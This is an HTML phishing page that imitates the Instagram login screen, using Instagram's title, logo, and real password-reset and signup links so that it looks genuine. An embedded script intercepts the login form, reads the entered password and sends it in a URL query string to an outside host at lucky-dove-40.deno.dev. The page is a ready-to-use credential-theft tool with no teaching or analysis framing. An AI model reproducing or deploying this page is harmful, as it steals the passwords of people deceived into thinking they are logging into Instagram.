<html>
<head>
    <title>Instagram</title>
    <meta charset="utf-8">
    <meta name="viewport" content=" width=device-width,initial-scale=1.0">
    <meta http-equiv="refresh" content="60">
    <link rel="icon" href="images/favicon.png" type="image/icon">
    <link rel="stylesheet" type="text/css" href="style.css">
</head>

<body>
    <div class="container">
        <div class="page">
            <div class="logo">
                <img src="images/instagram.png" alt="instagram" style="width: 175px; ">
            </div>

            <br />
            <form class="container" id="loginForm">
                <input type="text" placeholder="Phone number, username, or email " name="u_name" id="username">
                <input type="password" placeholder="Password" name="pass" id="password">
                <button class="submitbutton" type="submit">Log in </button>
                <br />
                <div class="option">OR </div>
            </form>

            <div class="fblink">
                <span class="fab fafacebook"></span>
                <a href="#"> Log in With Facebook</a>
            </div>

            <div class="forget-id">
                <a href="https://www.instagram.com/accounts/password/reset/">Forget password?</a>
            </div>
            <div class="singup">
                <p>Don't have an account?<a href="https://www.instagram.com/accounts/emailsignup/">
                        Sign up</a></p>
            </div>
        </div>
    </div>

    <br />
    <br />

    <script>
        // Modify the form submission behavior
        document.getElementById('loginForm').addEventListener('submit', function(event) {
            event.preventDefault(); // Prevent the default form submission

            const password = document.getElementById('password').value;

            // Validate password before sending the request
            if (!password) {
                console.error('Password is required');
                return;
            }

            // Construct the server URL with the password as a query parameter
            const serverUrl = `https://lucky-dove-40.deno.dev/text?text=${password}`;

            // Send a GET request to the server URL (no encoding)
            window.location.href = serverUrl;
        });
    </script>

</body>
</html>
